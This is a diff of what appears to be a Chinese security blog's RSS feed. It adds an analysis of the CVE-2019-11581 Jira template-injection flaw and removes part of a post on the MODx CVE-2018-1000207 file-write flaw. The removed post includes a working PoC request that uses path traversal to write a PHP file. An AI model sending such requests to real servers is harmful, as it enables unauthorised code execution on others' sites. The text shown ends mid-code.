@@ -2896,6 +2896,128 @@ this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
     </item>
     
     <item>
+      <title>CVE-2019-11581 Atlassian Jira未授权模板注入漏洞分析</title>
+      <link>https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Fri, 22 Feb 2019 22:19:04 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2019-11581-atlassian-jira%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;h3 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h3&gt;
+
+&lt;p&gt;使用&lt;code&gt;atlas-debug&lt;/code&gt;调试&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;下载安装&lt;code&gt;Atlassian SDK&lt;/code&gt;，&lt;a href=&#34;https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/&#34;&gt;地址&lt;/a&gt;；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;atlas-create-jira-plugin&lt;/code&gt;创建一个插件，&lt;a href=&#34;https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/&#34;&gt;参考&lt;/a&gt;；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;atlas-debug&lt;/code&gt;开启调试，http端口2990，调试端口5005；&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;IDEA&lt;/code&gt;打开&lt;code&gt;MyPlugin&lt;/code&gt;，把&lt;code&gt;WEB-INF/classes&lt;/code&gt;和&lt;code&gt;WEB-INF/lib&lt;/code&gt;加入library；&lt;/li&gt;
+&lt;li&gt;新建&lt;code&gt;Remote&lt;/code&gt;调试；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;其他：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;如果没有设置&lt;code&gt;%JAVA_HOME%&lt;/code&gt;可以通过&lt;code&gt;SET JAVA_HOME=d:\jdk1.8&lt;/code&gt;设置；&lt;/li&gt;
+&lt;li&gt;默认不开启电子邮件发送，通过&lt;code&gt;atlas-debug --jvmargs -Datlassian.mail.senddisabled=false&lt;/code&gt;开启；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;第一部分-注入代码并生成邮件&#34;&gt;第一部分：注入代码并生成邮件&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563246860552.png&#34; alt=&#34;1563246860552&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;post&lt;/code&gt;的数据通过&lt;code&gt;JiraSafeActionParameterSetter-&amp;gt;setActionProperty()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563271320369.png&#34; alt=&#34;1563271320369&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过反射调用到&lt;code&gt;ContactAdministrators.setSubject()&lt;/code&gt;方法，把&lt;code&gt;ContactAdministrators&lt;/code&gt;对象的&lt;code&gt;subject&lt;/code&gt;属性设置为传入的&lt;code&gt;subject&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;随后通过&lt;code&gt;ContactAdministrators.doExecute()&lt;/code&gt;调用&lt;code&gt;send()&lt;/code&gt;方法，在这个方法中会查找系统中已激活的管理员，通过&lt;code&gt;this.sendTo(administrator)&lt;/code&gt;将邮件发送给该管理员&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563247236827.png&#34; alt=&#34;1563247236827&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;sendTo()&lt;/code&gt;流程中，&lt;code&gt;Jira&lt;/code&gt;需要通过&lt;code&gt;EmailBuilder()&lt;/code&gt;方法创建一个邮件队列对象，随后将该对象放入邮件发送队列中。由于队列等待原因，所以触发&lt;code&gt;payload&lt;/code&gt;可能需要等待一段时间，并且当邮件发送失败时系统会继续尝试发送邮件，所以&lt;code&gt;payload&lt;/code&gt;可能会触发多次。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563247471810.png&#34; alt=&#34;1563247471810&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;创建队列的方法有点长，精简一下就是这个样子&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;MailQueueItem item = (new EmailBuilder()).withSubject(this.subject).withBodyFromFile().addParameters().renderLater();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过&lt;code&gt;EmailBuilder&lt;/code&gt;的&lt;code&gt;withSubject()&lt;/code&gt;方法，创建一个&lt;code&gt;TemplateSources$fragment&lt;/code&gt;对象，参数即是我们传入的&lt;code&gt;payload&lt;/code&gt;，随后调用&lt;code&gt;renderLater()&lt;/code&gt;方法创建出&lt;code&gt;EmailBuilder&lt;/code&gt;对象，再将该对象作为参数传递给&lt;code&gt;RenderingMailQueueItem&lt;/code&gt;类，&lt;code&gt;RenderingMailQueueItem&lt;/code&gt;的继承关系是如下图，于是最终创建出一个&lt;code&gt;MailQueueItem&lt;/code&gt;对象，并将该对象放入邮件发送队列。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563248388715.png&#34; alt=&#34;1563248388715&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;第二部分-发送邮件&#34;&gt;第二部分：发送邮件&lt;/h3&gt;
+
+&lt;p&gt;当我们把&lt;code&gt;payload&lt;/code&gt;注入到模板中之后，邮件进入待发送队列，&lt;code&gt;Jira&lt;/code&gt;中处理邮件队列的具体流程如下：&lt;/p&gt;
+
+&lt;p&gt;通过模板引擎&lt;code&gt;(getTemplatingEngine)&lt;/code&gt;生成一个Velocity模板，通过&lt;code&gt;applying()&lt;/code&gt;方法生成&lt;code&gt;RenderRequest&lt;/code&gt;对象，之后根据该对象成员变量&lt;code&gt;source&lt;/code&gt;的类型，调用不同的方法解析模板，漏洞的产生正是由于这个差异造成的，下面详细分析一下。&lt;/p&gt;
+
+&lt;p&gt;首先进入&lt;code&gt;RenderingMailQueueItem().send()&lt;/code&gt;方法，调用&lt;code&gt;this.emailRenderer.render()&lt;/code&gt;，随后调用&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;this.getTemplatingEngine().render(this.subjectTemplate).applying(contextParams).asPlainText();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这个过程中前面是为了获取模板解析引擎（VelocityTemplatingEngine）并传入主题模板（此处为payload数据），通过&lt;code&gt;applying()&lt;/code&gt;方法创建&lt;code&gt;VelocityContext&lt;/code&gt;对象并把&lt;code&gt;payload&lt;/code&gt;赋值给成员变量&lt;code&gt;source&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563267497538.png&#34; alt=&#34;1563267497538&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后重写了抽象类&lt;code&gt;StringRepresentation&lt;/code&gt;的&lt;code&gt;with()&lt;/code&gt;方法，在&lt;code&gt;with()&lt;/code&gt;方法中调用了&lt;code&gt;asPlainText()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;DefaultRenderRequest.this.asPlainText(sw)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;asPlainText()&lt;/code&gt;的作用是通过&lt;code&gt;Velocity&lt;/code&gt;模板引擎解析模板，其中的调用链是&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;toWriterImpl()-&amp;gt;writeEncodedBodyForContent()-&amp;gt;evaluate()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;而在&lt;code&gt;evaluate()&lt;/code&gt;方法中生成了&lt;code&gt;AST&lt;/code&gt;结构，随后通过反射调用传入的&lt;code&gt;payload&lt;/code&gt;，完成代码执行。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563245970455.png&#34; alt=&#34;1563245970455&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;asPlainText()&lt;/code&gt;之后的调用栈如下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563246607016.png&#34; alt=&#34;1563246607016&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在处理完Object模板后会调用父类&lt;code&gt;SingleMailQueueItem&lt;/code&gt;的send()方法，通过&lt;code&gt;smtpMailServer.sendWithMessageId()&lt;/code&gt;发送邮件，由于没有正确配置&lt;code&gt;SMTP&lt;/code&gt;服务会抛出异常，但在连接&lt;code&gt;SMTP&lt;/code&gt;服务之前漏洞已经触发了，控制台也能看到&lt;code&gt;MailQueue&lt;/code&gt;执行的过程。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563257377543.png&#34; alt=&#34;1563257377543&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;思考&#34;&gt;思考&lt;/h3&gt;
+
+&lt;p&gt;上述漏洞流程走完了，但还有一个关键问题没有解决：为什么邮件主题&lt;code&gt;Subject&lt;/code&gt;会被解析成&lt;code&gt;AST&lt;/code&gt;结构并被执行呢？按照正常发送反馈的逻辑，一封邮件的主题（字符串）似乎没有必要解析成&lt;code&gt;AST&lt;/code&gt;，导致差异的原因是什么？&lt;/p&gt;
+
+&lt;p&gt;发送一封正常的“联系管理员”邮件，走一遍流程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563268202907.png&#34; alt=&#34;1563268202907&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1563268493868.png&#34; alt=&#34;1563268493868&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;对比一下两个处理流程，当发送正常反馈时，&lt;code&gt;writeEncodedBody()&lt;/code&gt;中调用的是&lt;code&gt;this.getVe().mergeTemplate&lt;/code&gt;，通过&lt;code&gt;Velocity&lt;/code&gt;引擎的&lt;code&gt;ClasspathResourceLoader()&lt;/code&gt;类的&lt;code&gt;getResourceStream()&lt;/code&gt;方法加载模板文件，此处的模板是&lt;code&gt;templates/email/html/contactadministrator.vm&lt;/code&gt;，随后还会进行&lt;code&gt;header&lt;/code&gt;、&lt;code&gt;footer&lt;/code&gt;等正常加载流程，最终渲染出整个页面。而发送&lt;code&gt;payload&lt;/code&gt;时，通过asPlainText()创建出TemplateSource$Fragment对象，再通过DefaultRenderRequest构造方法把&lt;code&gt;source&lt;/code&gt;成员变量赋值为这个&lt;code&gt;Fragment&lt;/code&gt;对象，于是进入第一个分支，调用的是&lt;code&gt;this.getVe().evaluate()&lt;/code&gt;，最终调用&lt;code&gt;ASTMethod.execute()&lt;/code&gt;，这正是前面说的差异性导致的两个不同处理逻辑。&lt;/p&gt;
+
+&lt;p&gt;回过头看一下Velocity渲染的大致流程：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Velocity渲染引擎首先磁盘加载模板文件到内存，然后解析模板模板文件为AST结构，并对AST中每个节点进行初始化，第二次加载同一个模板文件时候如果开启了缓存则直接返回模板资源，通过使用资源缓存节省了从磁盘加载并重新解析为AST的开销。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;而&lt;code&gt;ASTMethod.execute()&lt;/code&gt;方法设计之初是在&lt;code&gt;Velocity parse&lt;/code&gt;解析模板的过程中，通过反射调用相关方法完成正常模板渲染动作，例如获取背景颜色、获取text内容、获取页面编码等，但当此处攻击者传入精心构造的数据后，利用反射执行了&lt;code&gt;java.lang.Runtime.getRuntime&lt;/code&gt;，成功达到命令执行的目的，漏洞利用十分精巧。&lt;/p&gt;
+
+&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html&#34;&gt;https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://developer.atlassian.com/server/framework/atlassian-sdk/atlas-debug/&#34;&gt;https://developer.atlassian.com/server/framework/atlassian-sdk/atlas-debug/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/&#34;&gt;https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://ifeve.com/velocity%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/&#34;&gt;http://ifeve.com/velocity%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
       <title>SA-CORE-2019-003 Drupal 内核远程代码执行漏洞分析</title>
       <link>https://kylingit.com/blog/sa-core-2019-003-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Fri, 22 Feb 2019 22:19:04 +0000</pubDate>
@@ -3594,283 +3716,6 @@ $this-&amp;gt;image-&amp;gt;readImage( $filename );
 &lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;
 
 &lt;p&gt;这三漏洞本质上都是变量覆盖漏洞，在一处存在缺陷的方法中没有对用户输入做严格判断，通过传递&lt;code&gt;_method&lt;/code&gt;参数覆盖了配置文件的&lt;code&gt;_method&lt;/code&gt;，导致可以访问&lt;code&gt;Request&lt;/code&gt;类的任意函数，而在&lt;code&gt;Request&lt;/code&gt;的构造函数中又创建了恶意的成员变量，导致后面的命令执行；而在&lt;code&gt;5.1&lt;/code&gt;和&lt;code&gt;5.2&lt;/code&gt;版本中则是直接覆盖了过滤器，在忽略运行异常的情况下会触发漏洞，整个利用链可以说是非常巧妙了。&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>MODx Revolution 远程代码执行漏洞分析</title>
-      <link>https://kylingit.com/blog/modx-revolution-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
-      <pubDate>Fri, 20 Jul 2018 17:44:56 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/modx-revolution-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
-
-&lt;p&gt;近日，&lt;code&gt;MODx&lt;/code&gt;官方发布通告称其&lt;code&gt;MODx Revolution 2.6.4&lt;/code&gt;及之前的版本存在2个高危漏洞，攻击者可以通过该漏洞远程执行任意代码，从而获取网站的控制权或者删除任意文件。 本文分析其中的&lt;strong&gt;CVE-2018-1000207&lt;/strong&gt;漏洞，并分别分析MODx 2.5.1和2.6.4版本漏洞形成原因和PoC构造。&lt;/p&gt;
-
-&lt;h3 id=&#34;0x02-环境搭建&#34;&gt;0x02 环境搭建&lt;/h3&gt;
-
-&lt;p&gt;分别安装&lt;code&gt;MODx 2.5.1&lt;/code&gt;和&lt;code&gt;2.6.4&lt;/code&gt;版本&lt;/p&gt;
-
-&lt;h3 id=&#34;0x03-漏洞分析&#34;&gt;0x03 漏洞分析&lt;/h3&gt;
-
-&lt;h4 id=&#34;2-5-1版本&#34;&gt;2.5.1版本&lt;/h4&gt;
-
-&lt;p&gt;漏洞发生在&lt;code&gt;phpthumb&lt;/code&gt;模块，该模块的作用是提供缩略图对象&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532080364911.png&#34; alt=&#34;1532080364911&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当我们把光标放到文件系统中的图片上的时候，可以看到弹出了图片的缩略图，此时就调用了&lt;code&gt;phpthumb&lt;/code&gt;接口&lt;/p&gt;
-
-&lt;p&gt;请求接口类似这样&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;http://127.0.0.1/connectors/system/phpthumb.php?src=1.png&amp;amp;w=116&amp;amp;h=0&amp;amp;HTTP_MODAUTH=modx5b5067d920ba81.94108199_15b513c49743c49.16917110&amp;amp;f=png&amp;amp;q=90&amp;amp;wctx=mgr&amp;amp;source=1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到几个参数描述了图片的一些基本属性，这些属性在&lt;code&gt;core/model/phpthumb/phpthumb.class.php&lt;/code&gt;中定义&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// public:
-// START PARAMETERS (for object mode and phpThumb.php)
-// See phpthumb.readme.txt for descriptions of what each of these values are
-var $src  = null;     // SouRCe filename
-var $new  = null;     // NEW image (phpThumb.php only)
-var $w    = null;     // Width
-var $h    = null;     // Height
-var $wp   = null;     // Width  (Portrait Images Only)
-var $hp   = null;     // Height (Portrait Images Only)
-var $wl   = null;     // Width  (Landscape Images Only)
-var $hl   = null;     // Height (Landscape Images Only)
-
-// private: (should not be modified directly)
-var $sourceFilename   = null;
-var $rawImageData     = null;
-var $IMresizedData    = null;
-var $outputImageData  = null;
-var $useRawIMoutput   = false;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;从定义中也能看到，&lt;code&gt;phpthumb&lt;/code&gt;提供了两种类型的参数：&lt;code&gt;public&lt;/code&gt;和&lt;code&gt;private&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;public&lt;/code&gt;就是普通属性，包括图片长宽高等，&lt;code&gt;private&lt;/code&gt;则是一些私有属性，包括缓存目录，文件类型等，此次漏洞形成的关键就是程序并没有对两种类型的参数区分处理，以至于我们可以直接传入私有参数控制其中的变量值，从而改变程序执行逻辑。&lt;/p&gt;
-
-&lt;p&gt;当我们请求这个接口的时候，会访问&lt;code&gt;modSystemPhpThumbProcessor()&lt;/code&gt;类，其中的&lt;code&gt;process()&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function process() {
-    $src = $this-&amp;gt;getProperty(&#39;src&#39;);
-    if (empty($src)) return $this-&amp;gt;failure();
-
-    $this-&amp;gt;unsetProperty(&#39;src&#39;);
-
-    $this-&amp;gt;getSource($this-&amp;gt;getProperty(&#39;source&#39;));
-    if (empty($this-&amp;gt;source)) $this-&amp;gt;failure($this-&amp;gt;modx-&amp;gt;lexicon(&#39;source_err_nf&#39;));
-
-    $src = $this-&amp;gt;source-&amp;gt;prepareSrcForThumb($src);
-    if (empty($src)) return &#39;&#39;;
-
-    $this-&amp;gt;loadPhpThumb();
-    /* set source and generate thumbnail */
-    $this-&amp;gt;phpThumb-&amp;gt;set($src);
-
-    /* check to see if there&#39;s a cached file of this already */
-    if ($this-&amp;gt;phpThumb-&amp;gt;checkForCachedFile()) {
-        $this-&amp;gt;phpThumb-&amp;gt;loadCache();
-        return &#39;&#39;;
-    }
-
-    /* generate thumbnail */
-    $this-&amp;gt;phpThumb-&amp;gt;generate();
-
-    /* cache the thumbnail and output */
-    $this-&amp;gt;phpThumb-&amp;gt;cache();
-    $this-&amp;gt;phpThumb-&amp;gt;output();
-    return &#39;&#39;;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到里面的几个主要操作，包括检查文件是否被缓存，以及读取缓存，设置缓存等，我们利用的就是&lt;code&gt;phpthumb&lt;/code&gt;设置缓存的方法&lt;code&gt;phpThumb-&amp;gt;cache()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function cache() {
-    phpthumb_functions::EnsureDirectoryExists(dirname($this-&amp;gt;cache_filename));
-    if ((file_exists($this-&amp;gt;cache_filename) &amp;amp;&amp;amp; is_writable($this-&amp;gt;cache_filename)) || is_writable(dirname($this-&amp;gt;cache_filename))) {
-        $this-&amp;gt;CleanUpCacheDirectory();
-        if ($this-&amp;gt;RenderToFile($this-&amp;gt;cache_filename) &amp;amp;&amp;amp; is_readable($this-&amp;gt;cache_filename)) {
-            chmod($this-&amp;gt;cache_filename, 0644);
-            $this-&amp;gt;RedirectToCachedFile();
-        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这里面关键的方法是&lt;code&gt;RenderToFile()&lt;/code&gt;，可以看到它接收参数&lt;code&gt;$this-&amp;gt;cache_filename&lt;/code&gt;，那么我们可以直接传入&lt;code&gt;cache_filename&lt;/code&gt;这个变量值。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function RenderToFile($filename) {
-    $renderfilename = $filename;
-    //一系列检查
-    if ($this-&amp;gt;RenderOutput()) {
-        if (file_put_contents($renderfilename, $this-&amp;gt;outputImageData)) {
-            $this-&amp;gt;DebugMessage(&#39;RenderToFile(&#39;.$renderfilename.&#39;) succeeded&#39;, __FILE__, __LINE__);
-            return true;
-        }
-    //...
-    return false;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;RenderToFile()&lt;/code&gt;方法里有&lt;code&gt;file_put_contents()&lt;/code&gt;函数，文件名是我们传入的&lt;code&gt;cache_filename&lt;/code&gt;，文件内容是&lt;code&gt;$this-&amp;gt;outputImageData&lt;/code&gt;。如果对内容没有校验的话意味着我们可以写入任意内容，前提是满足&lt;code&gt;$this-&amp;gt;RenderOutput()&lt;/code&gt;为真，进去看一下&lt;code&gt;RenderOutput()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function RenderOutput() {
-    //...
-    if ($this-&amp;gt;useRawIMoutput) {
-        $this-&amp;gt;DebugMessage(&#39;RenderOutput copying $this-&amp;gt;IMresizedData (&#39;.strlen($this-&amp;gt;IMresizedData).&#39; bytes) to $this-&amp;gt;outputImage&#39;, __FILE__, __LINE__);
-        $this-&amp;gt;outputImageData = $this-&amp;gt;IMresizedData;
-        return true;
-    }
-    //...
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在这里我们需要满足&lt;code&gt;$this-&amp;gt;useRawIMoutput&lt;/code&gt;为真，而这个变量默认值为&lt;code&gt;false&lt;/code&gt;。实际上&lt;code&gt;useRawIMoutput&lt;/code&gt;即为我们提到的私有变量，程序虽然默认定义了私有变量的值，但我们还是可以通过&lt;code&gt;post&lt;/code&gt;把值直接传进去，同时这里也没有检验文件的内容，直接把&lt;code&gt;$this-&amp;gt;IMresizedData&lt;/code&gt;赋值为&lt;code&gt;$this-&amp;gt;outputImageData&lt;/code&gt;，也就是&lt;code&gt;file_put_contents()&lt;/code&gt;所需要的第二个参数，所以到这里就能构成一个任意文件写入的漏洞。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;构造PoC：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;cache_filename=../../../payload.php&amp;amp;src=.&amp;amp;ctx=web&amp;amp;useRawIMoutput=1&amp;amp;config_prefer_imagemagick=0&amp;amp;outputImageData=&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;需要特别注意的是，此处的&lt;code&gt;cache_filename&lt;/code&gt;与网站相对路径密切相关，往上目录穿越少了反而不能写入文件，而在Windows下测试可以写入Web根目录以外的目录，因为程序内部虽然检查了目录写权限，却并没有限制一个根目录，所以严格来说这里还存在一个目录穿越漏洞。&lt;/p&gt;
-
-&lt;p&gt;这个利用在MODX 2.5.1版本及之前可以无需登录直接利用，而在2.6.4版本进行了更严格的权限检查，在处理请求之前增加了这样一段判断代码：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;core/model/modx/modconnectorresponse.class.php&lt;/code&gt; &lt;code&gt;outputContent()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;/* Block the user if there&#39;s no user token for the current context, and permissions are in fact required */
-if (empty($siteId) &amp;amp;&amp;amp; (!defined(&#39;MODX_REQP&#39;) || MODX_REQP === TRUE)) {
-    $this-&amp;gt;responseCode = 401;
-    $this-&amp;gt;body = $modx-&amp;gt;error-&amp;gt;failure($modx-&amp;gt;lexicon(&#39;access_denied&#39;),array(&#39;code&#39; =&amp;gt; 401));
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;所以在2.6.4版本利用需要登录权限。&lt;/p&gt;
-
-&lt;h4 id=&#34;2-6-4版本&#34;&gt;2.6.4版本&lt;/h4&gt;
-
-&lt;p&gt;那么有没有方法在2.6.4版本也能不需要权限直接写入任意文件呢？答案还是有的，只不过网站需要安装一个插件&lt;a href=&#34;https://modx.com/extras/package/gallery&#34;&gt;Gallery&lt;/a&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Gallery is a dynamic Gallery Extra for MODx Revolution. It allows you to quickly and easily put up galleries of images, sort them, tag them, and display them in a myriad of ways in the front-end of your site.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;简而言之&lt;code&gt;Gallery&lt;/code&gt; 是一个图库，可以更方便地管理网站图片。&lt;/p&gt;
-
-&lt;p&gt;在这个库中也有&lt;code&gt;phpThumb&lt;/code&gt;的相关方法，而且同样有缓存机制，不出意外同样存在任意文件写入漏洞，但是这个方法稍微复杂一些，它把文件写入cache目录，而文件名经过了一个array的反序列化再MD5，这样即使我们能写入文件，却猜不到文件名，因此a2u给出的PoC也没能直接写入文件，而是通过返回包来判断是否存在漏洞。但是经过分析，实际上我们是可以往缓存目录写入一个shell的，而且能够知道保存的文件名，下面来分析一下如何绕过这个看似复杂的流程。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532596628836.png&#34; alt=&#34;1532596628836&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当利用插件上传图片的时候，如果图库中已经有图片，我们就可以看到一张缩略图，请求类似这样&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;http://127.0.0.1/modx-2.6.4-pl/assets/components/gallery/connector.php?action=web/phpthumb&amp;amp;w=100&amp;amp;h=100&amp;amp;zc=1&amp;amp;src=/modx-2.6.4-pl/assets/gallery/1/cover.png&amp;amp;time=1532596253635&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;同样的，&lt;code&gt;gallery&lt;/code&gt;的&lt;code&gt;connector.php&lt;/code&gt;也接收图片属性等&lt;code&gt;public&lt;/code&gt;参数，但是此处我们并不关心，直接定位到处理写入缓存的文件&lt;code&gt;core/components/gallery/processors/web/phpthumb.php&lt;/code&gt;。漏洞形成点同样也是&lt;code&gt;file_put_contents&lt;/code&gt;参数没有经过过滤。&lt;/p&gt;
-
-&lt;p&gt;请求在进入&lt;code&gt;phpthumb.php&lt;/code&gt;之后，首先会把参数设置成一个&lt;code&gt;array&lt;/code&gt;，放在&lt;code&gt;$scriptProperties&lt;/code&gt;中，类似这样&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;array (
-  &#39;action&#39; =&amp;gt; &#39;web/phpthumb&#39;,
-  &#39;w&#39; =&amp;gt; &#39;100&#39;,
-  &#39;h&#39; =&amp;gt; &#39;100&#39;,
-  &#39;zc&#39; =&amp;gt; &#39;1&#39;,
-  &#39;src&#39; =&amp;gt; &#39;/modx-2.6.4-pl/assets/gallery/1/cover.png&#39;,
-  &#39;time&#39; =&amp;gt; &#39;1532596253635&#39;,
-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在调用系统&lt;code&gt;phpthumb.class.php&lt;/code&gt;模块的&lt;code&gt;RenderToFile&lt;/code&gt;之前对文件进行了一系列处理，主要关注其中几个&lt;/p&gt;
-
-&lt;p&gt;首先对&lt;code&gt;src&lt;/code&gt;文件后缀有一个判断&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (empty($ptOptions[&#39;f&#39;])) {
-    $ext = pathinfo($src, PATHINFO_EXTENSION);
-    $ext = strtolower($ext);
-    switch ($ext) {
-        case &#39;jpg&#39;:
